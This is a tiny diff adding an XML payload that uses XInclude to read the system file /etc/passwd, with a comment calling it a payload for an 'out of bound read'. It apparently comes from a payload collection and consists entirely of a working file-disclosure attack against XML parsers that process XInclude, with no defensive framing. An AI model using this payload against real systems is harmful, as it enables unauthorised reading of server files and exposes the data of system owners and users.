@@ -1,0 +1,3 @@
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd/"/></foo>
+
+//The above payload used for out of bound read
